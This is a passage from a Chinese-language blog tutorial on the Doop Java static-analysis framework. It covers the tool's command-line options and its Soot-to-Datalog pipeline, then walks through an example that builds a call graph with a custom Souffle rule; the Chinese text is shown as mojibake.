analyses) -----,</span><br><span class="line">                                                          2-object-sensitive+heap-plus, adaptive-insens-2objH, adaptive2-insens-2objH, must-point-to, naive, paddle-2-object-sensitive, paddle-2-object-sensitive+heap,</span><br><span class="line">                                                          partial-insens-s2objH, refA-2-call-site-sensitive+heap, refA-2-object-sensitive+heap, refA-2-type-sensitive+heap, refB-2-call-site-sensitive+heap,</span><br><span class="line">                                                          refB-2-object-sensitive+heap, refB-2-type-sensitive+heap, scc-2-object-sensitive+heap, selective-2-type-sensitive+heap, selective_A-1-object-sensitive,</span><br><span class="line">                                                          selective_B-1-object-sensitive, special-2-object-sensitive+heap, stutter-2-object-sensitive+heap, uniform-1-object-sensitive,</span><br><span class="line">                                                          uniform-2-object-sensitive+heap, uniform-2-type-sensitive+heap</span><br></pre></td></tr></table></figure><p>ä»ä¸Šå¾€ä¸‹åˆ—ä¸¾å¯èƒ½ä¼šç”¨åˆ°çš„ä¸€äº›é€‰é¡¹ï¼Œ<code>--android</code> è¡¨ç¤ºåˆ†æå®‰å“ç¨‹åºï¼›<code>--app-only</code> è¡¨ç¤ºè§£æåº”ç”¨ç¨‹åºè¾“å…¥ï¼Œå¿½ç•¥ JDKï¼›<code>--cfg</code> è¡¨ç¤ºç”Ÿæˆæ§åˆ¶æµå›¾ï¼›<code>--dry-run</code> ç”Ÿæˆäº‹å®ï¼Œä¸æ‰§è¡Œåˆ†æï¼›<code>--extra-logic</code> ç”¨äºæ·»åŠ è‡ªå·±çš„ Datalog è§„åˆ™ï¼›<code>--gen-opt-directives</code> æ·»åŠ ç”¨äºè°ƒä¼˜çš„å…³ç³»ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--android                                              Force Android mode <span class="keyword">for</span> code inputs that are not <span class="keyword">in</span> .apk format.</span><br><span class="line">--app-only                                             Only analyze the application input(s), ignore libraries/platform.</span><br><span class="line">--cfg                                                  Perform a CFG analysis.</span><br><span class="line">--dry-run                                              Do a dry run of the analysis (generate facts and compile but don<span class="string">&#x27;t run analysis logic).</span></span><br><span class="line"><span class="string">--extra-logic &lt;FILE&gt;                                   Include files with extra rules.</span></span><br><span class="line"><span class="string">--gen-opt-directives                                   Generate additional relations for code optimization uses.</span></span><br></pre></td></tr></table></figure><p><code>-h</code> å¸®åŠ©ä¿¡æ¯å¯ä»¥åˆ†ç±»æŸ¥çœ‹ï¼›<code>-i</code> æŒ‡å®šè¾“å…¥ï¼Œç”šè‡³å¯ä»¥æ˜¯ maven-idï¼ˆä¾‹å¦‚ï¼Œ<code>commons-collections:commons-collections:3.1</code>ï¼‰ï¼›<code>--id ç”¨äºæŒ‡å®šè¾“å‡ºæ–‡ä»¶å¤¹çš„åç§°ï¼Œé»˜è®¤éšæœºé•¿ä¸²</code>ï¼›<code>-L</code> æ”¹å˜æ—¥å¿—çº§åˆ«ï¼›<code>--max-memory</code> è®¾ç½®å†…å­˜æ¶ˆè€—ä¸Šé™ï¼Œæ¨æµ‹ä¸æŒ‡å®šå°±æ˜¯æ— ä¸Šé™ï¼ˆå› ä¸ºè·‘åˆ°è¿‡ 800G å†…å­˜ï¼‰ï¼›<code>--platform</code> é»˜è®¤ Java8 ä¸ç”¨è®¾ç½®ï¼›<code>-t</code> é»˜è®¤è¶…æ—¶æ—¶é—´ 90minï¼›<code>-v</code> æ‰“å°ç‰ˆæœ¬ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-h,--<span class="built_in">help</span> &lt;SECTION&gt;                                       Display <span class="built_in">help</span> and <span class="built_in">exit</span>. Valid values: all, configuration, data-flow, datalog-engine, entry-points, fact-generation, heap-snapshots, information-flow,</span><br><span class="line">                                                          native-code, open-programs, python, reflection, server-logic, statistics, xtras</span><br><span class="line">-i,--input-file &lt;INPUT&gt;                                   The (application) input files of the analysis. Accepted formats: .jar, .war, .apk, .aar, maven-id</span><br><span class="line">   --id &lt;ID&gt;                                              The analysis id. If omitted, it is automatically generated.</span><br><span class="line">-L,--level &lt;LOG_LEVEL&gt;                                    Set the <span class="built_in">log</span> level: debug, info or error (default: info).</span><br><span class="line">-l,--library-file &lt;LIBRARY&gt;                               The dependency/library files of the application. Accepted formats: .jar, .apk, .aar</span><br><span class="line">   --max-memory &lt;MEMORY_SIZE&gt;                             The maximum memory that the analysis can consume (does not include memory needed by fact generation). Example values: 2m, 4g.</span><br><span class="line">   --platform &lt;PLATFORM&gt;                                  The platform on <span class="built_in">which</span> to perform the analysis. For Android, the plaftorm suffix can either be <span class="string">&#x27;stubs&#x27;</span> (provided by the Android SDK), <span class="string">&#x27;fulljars&#x27;</span> (a custom</span><br><span class="line">                                                          Android build), or <span class="string">&#x27;apks&#x27;</span> (custom Dalvik equivalent). Default: java_8. Valid values: java_3, java_4, java_5, java_6, java_7, java_7_debug, java_8,</span><br><span class="line">                                                          java_8_debug, java_8_mini, java_9, java_10, java_11, java_12, java_13, java_14, java_15, java_16, android_22_fulljars, android_25_fulljars, android_2_stubs,</span><br><span class="line">                                                          android_3_stubs, android_4_stubs, android_5_stubs, android_6_stubs, android_7_stubs, android_8_stubs, android_9_stubs, android_10_stubs, android_11_stubs,</span><br><span class="line">                                                          android_12_stubs, android_13_stubs, android_14_stubs, android_15_stubs, android_16_stubs, android_17_stubs, android_18_stubs, android_19_stubs,</span><br><span class="line">                                                          android_20_stubs, android_21_stubs, android_22_stubs, android_23_stubs, android_24_stubs, android_25_stubs, android_26_stubs, android_27_stubs,</span><br><span class="line">                                                          android_28_stubs, android_29_stubs, android_25_apks, android_26_robolectric, python_2</span><br><span class="line">-t,--timeout &lt;TIMEOUT&gt;                                    The analysis execution timeout <span class="keyword">in</span> minutes (default: 90 minutes).</span><br><span class="line">-v,--version                                              Display version and <span class="built_in">exit</span>.</span><br></pre></td></tr></table></figure><p>æ•°æ®æµåˆ†æç›¸å…³é€‰é¡¹ï¼Œæ²¡æœ‰ç”¨è¿‡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--data-flow-goto-lib                                   Allow data-flow logic to go into library code using CHA.</span><br><span class="line">--data-flow-only-lib                                   Run data-flow logic only <span class="keyword">for</span> library code.</span><br></pre></td></tr></table></figure><p>é’ˆå¯¹ souffle å¼•æ“çš„é€‰é¡¹ï¼Œå¯ä»¥ç”¨ <code>--souffle-jobs</code> æŒ‡å®šæ›´å¤šçš„å¹¶è¡Œç©ºé—´ï¼Œå‰ææ˜¯åˆ†æèƒ½å¤Ÿæœ‰è¿™ä¹ˆå¤šå¹¶è¡Œï¼Œå¦åˆ™ä¹Ÿä¸ä¼šè¾¾åˆ°æŒ‡å®šçš„æ•°é‡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--souffle-jobs &lt;NUMBER&gt;                                Specify number of Souffle <span class="built_in">jobs</span> to run (default: 4).</span><br></pre></td></tr></table></figure><p>åˆ†æçš„å…¥å£ç‚¹é€‰æ‹©ï¼Œæ²¡æœ‰ç”¨è¿‡ï¼Œè²Œä¼¼ä¸æŒ‡å®šå¯»æ‰¾ main ç±»å°±è§¦å‘ open-program åˆ†æã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--discover-main-methods                                Discover main() methods.</span><br><span class="line">--discover-tests                                       Discover and treat <span class="built_in">test</span> code (e.g. JUnit) as entry points.</span><br><span class="line">--exclude-implicitly-reachable-code                    Don<span class="string">&#x27;t make any method implicitly reachable.</span></span><br><span class="line"><span class="string">--ignore-main-method                                   If main class is not given explicitly, do not try to discover it from jar/filename info. Open-program analysis variant may be triggered in this case.</span></span><br><span class="line"><span class="string">--main &lt;MAIN&gt;                                          Specify the main class(es) separated by spaces.</span></span><br></pre></td></tr></table></figure><p>å…³äºäº‹å®çš„ç”Ÿæˆï¼ŒDoop ä¸­çš„äº‹å®æ˜¯åŸºäº Soot çš„åˆ†æç”Ÿæˆã€‚<code>--fact-gen-cores</code> å¯ä»¥ç”¨æ¥å¢åŠ å¹¶è¡Œåº¦ï¼ŒåŒæ ·ï¼Œåˆ†æè¾¾ä¸åˆ°è¿™ä¹ˆå¤šå¹¶è¡Œé‚£ä¹Ÿä¸ä¼šè¾¾åˆ°æŒ‡å®šæ•°é‡ï¼›<code>--facts-only</code> åªç”Ÿæˆäº‹å®ï¼›<code>--generate-jimple</code> ç”Ÿæˆäº‹å®å’Œ Jimple/Shimple æ–‡ä»¶ï¼›<code>--wala-fact-gen</code> é€‰ç”¨ WALA ç”Ÿæˆäº‹å®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--also-resolve &lt;CLASS&gt;                                 Force resolution of class(es) by Soot.</span><br><span class="line">--cache                                                The analysis will use the cached facts, <span class="keyword">if</span> they exist.</span><br><span class="line">--dont-cache-facts                                     Don<span class="string">&#x27;t cache generated facts.</span></span><br><span class="line"><span class="string">--extract-more-strings                                 Extract more string constants from the input code (may degrade analysis performance).</span></span><br><span class="line"><span class="string">--fact-gen-cores &lt;NUMBER&gt;                              Number of cores to use for parallel fact generation.</span></span><br><span class="line"><span class="string">--facts-only                                           Only generate facts and exit.</span></span><br><span class="line"><span class="string">--generate-jimple                                      Generate Jimple/Shimple files along with .facts files.</span></span><br><span class="line"><span class="string">--input-id &lt;ID&gt;                                        Import facts from dir with id ID and start the analysis. Application/library inputs are ignored.</span></span><br><span class="line"><span class="string">--report-phantoms                                      Report phantom methods/types during fact generation.</span></span><br><span class="line"><span class="string">--thorough-fact-gen                                    Attempt to resolve as many classes during fact generation (may take more time).</span></span><br><span class="line"><span class="string">--unique-facts                                         Eliminate redundancy from .facts files.</span></span><br><span class="line"><span class="string">--wala-fact-gen                                        Use WALA to generate the facts.</span></span><br><span class="line"><span class="string">--Xfacts-subset &lt;SUBSET&gt;                               Produce facts only for a subset of the given classes. Valid values: PLATFORM, APP, APP_N_DEPS</span></span><br><span class="line"><span class="string">--Xignore-factgen-errors                               Continue with analysis despite fact generation errors.</span></span><br><span class="line"><span class="string">--Xsymlink-input-facts                                 Use symbolic links instead of copying cached facts. Used with --cache or --input-id.</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰æŒ‡å®šå…¥å£æˆ–æ²¡æœ‰æ‰¾åˆ° mainï¼Œå°†é»˜è®¤å¯ç”¨ <code>--open-programs xxx</code> å¯»æ‰¾åˆ†æçš„å…¥å£ç‚¹ï¼›å…¶ä»–ä¸¤ä¸ªé€‰é¡¹æ²¡ç”¨è¿‡ï¼Œä¹Ÿæ²¡è¯´æ˜ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--open-programs &lt;STRATEGY&gt;                             Create analysis entry points and environment using various strategies (such as <span class="string">&#x27;concrete-types&#x27;</span> or <span class="string">&#x27;jackee&#x27;</span>).</span><br><span class="line">--open-programs-context-insensitive-entrypoints</span><br><span class="line">--open-programs-heap-context-insensitive-entrypoints</span><br></pre></td></tr></table></figure><p>æ”¯æŒåˆ†æåå°„çš„ä¸€äº›é€‰é¡¹ï¼Œå¼„ä¸æ¸…æ¯ä¸ªé€‰é¡¹éƒ½åŒ…å«ä»€ä¹ˆåˆ†æçš„æƒ…å†µä¸‹ï¼Œä¸€å¾‹å»ºè®®ä½¿ç”¨ <code>--reflection-classic</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">--distinguish-reflection-only-string-constants         Merge all string constants except those useful <span class="keyword">for</span> reflection.</span><br><span class="line">--distinguish-string-buffers-per-package               Merges string buffer objects only on a per-package basis (default behavior <span class="keyword">for</span> reflection-classic).</span><br><span class="line">--light-reflection-glue                                Handle some shallow reflection patterns without full reflection support.</span><br><span class="line">--reflection                                           Enable logic <span class="keyword">for</span> handling Java reflection.</span><br><span class="line">--reflection-classic                                   Enable (classic subset of) logic <span class="keyword">for</span> handling Java reflection.</span><br><span class="line">--reflection-dynamic-proxies                           Enable handling of the Java dynamic proxy API.</span><br><span class="line">--reflection-high-soundness-mode                       Enable extra rules <span class="keyword">for</span> more sound handling of reflection.</span><br><span class="line">--reflection-invent-unknown-objects</span><br><span class="line">--reflection-method-handles                            Reflection-based handling of the method handle APIs.</span><br><span class="line">--reflection-refined-objects</span><br><span class="line">--reflection-speculative-use-based-analysis</span><br><span class="line">--reflection-substring-analysis                        Allows reasoning on what substrings may yield reflection objects.</span><br><span class="line">--tamiflex &lt;FILE&gt;                                      Use file with tamiflex data <span class="keyword">for</span> reflection.</span><br></pre></td></tr></table></figure><p><code>--stats none</code> å¯ä»¥ç”¨äºå…³é—­ç»Ÿè®¡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--stats &lt;LEVEL&gt;                                        Set statistics collection logic. Valid values: none, default, full</span><br></pre></td></tr></table></figure><p>å½¢å¦‚ <code>--X...</code> çš„é€‰é¡¹æ˜¯å®éªŒæ€§é€‰é¡¹ï¼Œä¸ä¸€å®šæ”¯æŒæ‰€æœ‰åˆ†æã€‚è¿™äº›å‚æ•°å¯èƒ½æ˜¯ä¸€æ¡ commit å¢åŠ çš„å°åŠŸèƒ½ï¼Œä¸å»ºè®®ä½¿ç”¨ï¼Œå› ä¸ºè¿™äº›å‚æ•°æœ¬èº«å°±åªç”¨äºç‰¹å®šåˆ†æã€‚</p><h2 id="åˆ†æé€»è¾‘"><a href="#åˆ†æé€»è¾‘" class="headerlink" title="åˆ†æé€»è¾‘"></a>åˆ†æé€»è¾‘</h2><p>Doop æ‰§è¡Œæµç¨‹å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰æ­¥ï¼š</p><ol><li>ä½¿ç”¨ soot ç”Ÿæˆ jimple æ–‡ä»¶<ul><li>ä½¿ç”¨ <code>--generate-jimple</code> å‚æ•°å¯ä»¥è¾“å‡º jimple æ–‡ä»¶ï¼Œåœ¨ output/<ID>/database/jimple æ–‡ä»¶å¤¹ä¸‹</li></ul></li><li>å°† jimple æ–‡ä»¶è½¬æ¢ä¸º datalog å¼•æ“çš„è¾“å…¥äº‹å®ï¼ˆ.factsï¼‰</li><li>ä½¿ç”¨ souffle å¼•æ“æ‰§è¡Œé€‰å®šçš„åˆ†æï¼Œå°†å…³ç³»è¾“å‡ºä¸º .csvï¼Œå³åˆ†æç»“æœ</li></ol><p>Doop åˆ†æå­—èŠ‚ç ï¼ˆæˆ– Android çš„ Dex ä»£ç ï¼‰ï¼Œä¸¤è€…éƒ½è¢«è½¬æ¢ä¸ºåä¸º Jimple çš„ä¸­é—´è¡¨ç¤ºï¼ˆIntermediate Representation, IRï¼‰ï¼Œå®é™…åˆ†æçš„å°±æ˜¯ jimpleï¼›å› ä¸ºå­—èŠ‚ç æ˜¯åŸºäºå †æ ˆçš„ï¼Œä½†æŒ‡é’ˆåˆ†æä¸­éœ€è¦å˜é‡/å±€éƒ¨å˜é‡æ¥åˆ†ææŒ‡å‘ï¼Œæ‰€ä»¥ä½¿ç”¨ Soot å°†åŸºäºå †æ ˆçš„å­—èŠ‚ç è½¬æ¢ä¸ºå…·æœ‰å±€éƒ¨å˜é‡çš„ä¸­é—´è¡¨ç¤ºã€‚ä¸‹ä¸€æ­¥å°† Jimple ä¸­é—´è¡¨ç¤ºè½¬æ¢ä¸º .facts æ–‡ä»¶ï¼ˆæ•°æ®åº“è¡¨ï¼‰ï¼Œç„¶åç”± Datalog é€»è¾‘åŠ è½½è¿™äº›æ–‡ä»¶ä½œä¸ºè¾“å…¥ã€‚Datalog ä»è¾“å…¥å¼€å§‹æ¨å¯¼äº‹å®ï¼Œå¡«å……å…³ç³»ï¼›ä¸€äº›å…³ç³»ä½¿ç”¨ <code>.output</code> æ ‡è®°è¾“å‡ºï¼Œä¿å­˜ä¸º .csv æ–‡ä»¶ï¼›å½“ Datalog æ‰§è¡Œç»ˆæ­¢æ—¶ï¼Œä¿å­˜çš„ .csv æ–‡ä»¶å°±æ˜¯åˆ†æè¾“å‡ºã€‚</p><p><img src="https://s2.loli.net/2021/12/17/NP1SnQWBdwMAzJu.jpg"></p><h2 id="æ‰§è¡Œç»“æœ"><a href="#æ‰§è¡Œç»“æœ" class="headerlink" title="æ‰§è¡Œç»“æœ"></a>æ‰§è¡Œç»“æœ</h2><p>ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œä¿å­˜ä¸º Main.java å¹¶ç”Ÿæˆ test.jar åŒ…ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        list.add(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>-i</code> æŒ‡å®šåˆ†æçš„ jar åŒ…ï¼›<code>-a context-insensitive</code> ä½¿ç”¨ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿåˆ†æï¼›<code>--stats none</code> å…³é—­ç»Ÿè®¡ä¿¡æ¯ï¼›<code>--generate-jinple</code> ç”Ÿæˆ Shimple/Jimple æ–‡ä»¶ï¼›<code>--fact-gen-cores 32 --souffle-jobs 32</code> æœ€å¤§å¹¶è¡Œä»»åŠ¡æ•°é‡ï¼›<code>--id test</code> æŒ‡å®šè¾“å‡ºæ–‡ä»¶å¤¹ testã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è€—æ—¶ 4m 24s</span></span><br><span class="line">./doop -i test.jar -a context-insensitive --stats none --generate-jimple --fact-gen-cores 32 --souffle-jobs 32 --id <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>åˆ†æå®Œæ¯•åï¼Œ<code>./doop/last-analysis/</code> å°†é“¾æ¥åˆ°æœ€æ–°çš„åˆ†æç»“æœï¼Œå³ <code>./doop/out/test/database</code>ï¼Œæ¯æ¬¡åˆ†æéƒ½å°†åœ¨ out ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª <ID> ç›®å½•ï¼ŒåŒ…å«è¾“å‡ºçš„æ•°æ®åº“ï¼ˆdatabaseï¼‰ã€è§„åˆ™æ–‡ä»¶ï¼ˆ<code>xxxanalysis.dl</code>ã€<code>gen_*.dl</code>ï¼‰ã€å…ƒæ•°æ®æ–‡ä»¶ï¼ˆmetaï¼‰ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯èƒ½æ˜¯å› ä¸ºæ²¡æœ‰å¯ç”¨ <code>--discover-main-methods</code> é€‰é¡¹ï¼Œæ‰€ä»¥è­¦å‘Šæ²¡æ‰¾åˆ° main ç±»ï¼Œå¹¶é»˜è®¤è§¦å‘ <code>--open-programs xxx</code>ï¼Œå¯ä»¥æ˜¾å¼å…³é—­ <code>--open-programs disabled</code>ã€‚ä½¿ç”¨çš„é…ç½®å¯ä»¥åœ¨å…ƒæ•°æ®æ–‡ä»¶ä¸­æŸ¥çœ‹ï¼Œè¿™é‡Œç”¨çš„æ˜¯ <code>jackee</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -e &quot;OPEN&quot; out&#x2F;test&#x2F;meta</span><br></pre></td></tr></table></figure><p>å¦‚æœæŒ‡å®šç”Ÿæˆ Jimple/Shimple æ–‡ä»¶ï¼Œé‚£ä¹ˆ database æ–‡ä»¶å¤¹ä¸‹ä¼šå¤šå‡ºä¸€ä¸ª jimple æ–‡ä»¶å¤¹ï¼›souffle åˆ†æä½¿ç”¨çš„æ˜¯ <code>gen_*.dl</code> æ–‡ä»¶ï¼Œå¯ä»¥ç”¨äºæŸ¥çœ‹å‘½åç©ºé—´ã€‚</p><p>database æ–‡ä»¶å¤¹ä¸­åŒ…å« .facts äº‹å®æ–‡ä»¶ï¼Œä»¥åŠè¾“å‡º .csvï¼Œè¾“å‡ºæ˜¯åœ¨ dl è§„åˆ™æ–‡ä»¶ä¸­æŒ‡å®šï¼Œå¯ä»¥ç¼–å†™è‡ªå®šä¹‰çš„è§„åˆ™æ–‡ä»¶å¹¶ä½¿ç”¨ <code>--extra-logic myrules.dl</code> åˆå¹¶åˆ†æã€‚</p><p>äº‹å®å’Œè¾“å‡ºçš„å†…å®¹æ ¼å¼å¯ä»¥åœ¨ doop/souffle-logic/ ç›®å½•ä¸‹æœç´¢ï¼Œæˆ–ç›´æ¥æŸ¥çœ‹ <code>gen_*.dl</code> æ–‡ä»¶ï¼Œå…¶ä¸­ <code>?</code> å¼€å¤´è¡¨ç¤ºå˜é‡åï¼ˆä¸€ç§çº¦å®šï¼Œæ²¡æœ‰ä¸ºä»€ä¹ˆï¼‰ã€‚</p><p>ä»¥ <code>AnyCallGraphEdge</code> ä¸ºä¾‹ï¼Œå£°æ˜åŒ…å«è°ƒç”¨è¯­å¥ã€æ–¹æ³•ä¸¤ä¸ªå‚æ•°ï¼Œå®šä¹‰ä¸ºå…¶ä»–è°ƒç”¨è¾¹çš„å¹¶é›†ï¼Œæœ€åç”¨ <code>.output</code> è¾“å‡ºåˆ° csv æ–‡ä»¶ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">AnyCallGraphEdge</span>(?instr:<span class="symbol">Instruction</span>, ?method:<span class="symbol">Method</span>)</span><br><span class="line"><span class="symbol">AnyCallGraphEdge</span>(?i, ?m) :- <span class="symbol">CallGraphEdge</span>(<span class="symbol">_</span>, ?i, <span class="symbol">_</span>, ?m).</span><br><span class="line"><span class="symbol">AnyCallGraphEdge</span>(?i, ?m) :- <span class="symbol">InvokedynamicBootCallGraphEdge</span>(<span class="symbol">_</span>, ?i, <span class="symbol">_</span>, ?m).</span><br><span class="line"><span class="symbol">AnyCallGraphEdge</span>(?i, ?m) :- <span class="symbol">LambdaCallGraphEdge</span>(<span class="symbol">_</span>, ?i, <span class="symbol">_</span>, ?m, <span class="symbol">_</span>).</span><br><span class="line"><span class="symbol">AnyCallGraphEdge</span>(?i, ?m) :- <span class="symbol">MethodHandleCallGraphEdge</span>(<span class="symbol">_</span>, ?i, <span class="symbol">_</span>, ?m, <span class="symbol">_</span>, <span class="symbol">_</span>).</span><br><span class="line"><span class="symbol">AnyCallGraphEdge</span>(?i, ?m) :- <span class="symbol">OpaqueCallGraphEdge</span>(?i, ?m).</span><br><span class="line">.output <span class="symbol">AnyCallGraphEdge</span>(<span class="symbol">IO</span>=<span class="string">&quot;file&quot;</span>,filename=<span class="string">&quot;AnyCallGraphEdge.csv&quot;</span>,delimiter=<span class="string">&quot;\t&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/17/AZk5M4dHwImoqbf.jpg"></p><h2 id="æ„é€ è°ƒç”¨å›¾"><a href="#æ„é€ è°ƒç”¨å›¾" class="headerlink" title="æ„é€ è°ƒç”¨å›¾"></a>æ„é€ è°ƒç”¨å›¾</h2><p>é‚£ä¹ˆèƒ½ä¸èƒ½ç›´æ¥ç”¨è°ƒç”¨è¾¹ <code>AnyCallGraphEdge</code> æ„é€ è°ƒç”¨å›¾å‘¢ï¼Œç­”æ¡ˆæ˜¯<strong>ä¸è¡Œ</strong>ï¼Œå› ä¸ºæ˜¯è¯­å¥æŒ‡å‘æ–¹æ³•ï¼Œè€Œä¸æ˜¯æ–¹æ³•æŒ‡å‘æ–¹æ³•ã€‚å› æ­¤ï¼Œè¿™é‡Œå°±å¯ä»¥è¯•ä¸€è¯•è‡ªå®šä¹‰è§„åˆ™äº†~</p><p>é¦–å…ˆæ‰¾åˆ°è¯­å¥æ‰€åŒ…å«çš„æ–¹æ³•è°ƒç”¨ï¼Œç”¨å…³ç³» <code>Instruction_Method</code> å°±å¯ä»¥å®šä½ï¼Œç„¶åå°†äºŒè€…è¿›è¡ŒåŒ¹é…è¿æ¥ï¼Œæœ€åè¾“å‡º <code>æ–¹æ³• -&gt; æ–¹æ³•</code> ä½œä¸ºè°ƒç”¨å›¾ã€‚è¿™é‡Œçš„ <code>Method</code> æ˜¯ Doop å®šä¹‰çš„ç±»å‹ï¼Œè¡¨ç¤ºæ–¹æ³•ï¼ˆå®é™…ä¸Šå°±æ˜¯å­—ç¬¦ä¸² <code>.type Method = symbol</code>ï¼‰ï¼Œè€Œå˜é‡ <code>?invocation</code> è¡¨ç¤ºæŒ‡ä»¤è¯­å¥ï¼ˆå®é™…ä¸Šä¹Ÿæ˜¯å­—ç¬¦ä¸² <code>.type Instruction = symbol</code>ï¼‰ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">CG</span>(?caller:<span class="symbol">Method</span>, ?callee:<span class="symbol">Method</span>)</span><br><span class="line"></span><br><span class="line"><span class="symbol">CG</span>(?caller, ?callee) :-</span><br><span class="line">  mainAnalysis.<span class="symbol">AnyCallGraphEdge</span>(?invocation, ?callee),</span><br><span class="line">  <span class="symbol">Instruction_Method</span>(?invocation, ?caller).</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">CG</span></span><br></pre></td></tr></table></figure><p>å°†ä¸Šè¿°è§„åˆ™ä¿å­˜åˆ° myrules.dl æ–‡ä»¶ä¸­ï¼Œé‡æ–°æ‰§è¡Œåˆ†æï¼Œ<code>--extra-logic myrules.dl</code> è¡¨ç¤ºæ·»åŠ è‡ªå®šä¹‰çš„è§„åˆ™ã€‚ç»æµ‹è¯•ï¼Œé»˜è®¤ <code>--open-programs jackee</code> ç”Ÿæˆçš„è°ƒç”¨å›¾ä¸­æ— æ³•æ‰¾åˆ° Main ç±»ç›¸å…³çš„è°ƒç”¨ï¼Œä½¿ç”¨ <code>--open-programs concrete-types</code> å³å¯ï¼Œä½†åˆ†æè€—æ—¶å¢åŠ ã€‚</p><ul><li>jackee å®é™…ä¸Šæ˜¯å¯¹ JavaEE çš„åˆ†æï¼Œå› æ­¤å»ºè®®é»˜è®¤ä½¿ç”¨ concrete-typesï¼Œç›¸å…³è®ºæ–‡ï¼š<a href="https://yanniss.github.io/enterprise-pldi20.pdf">Static Analysis of Java Enterprise Applications: Frameworks and Caches, the Elephants in the Room</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è€—æ—¶ 6m 2s</span></span><br><span class="line">./doop -i test.jar -a context-insensitive --stats none --generate-jimple --fact-gen-cores 32 --souffle-jobs 32 --open-programs concrete-types --extra-logic myrules.dl --id cg</span><br></pre></td></tr></table></figure><p>æœ€åå¯ä»¥åœ¨è°ƒç”¨å›¾ä¸­æŸ¥æ‰¾ Main ç±»ç›¸å…³çš„è°ƒç”¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -e <span class="string">&quot;Main:&quot;</span> out/cg/database/CG.csv</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2021/12/17/JEmRyi6DUYV3o7v.jpg"></p><h2 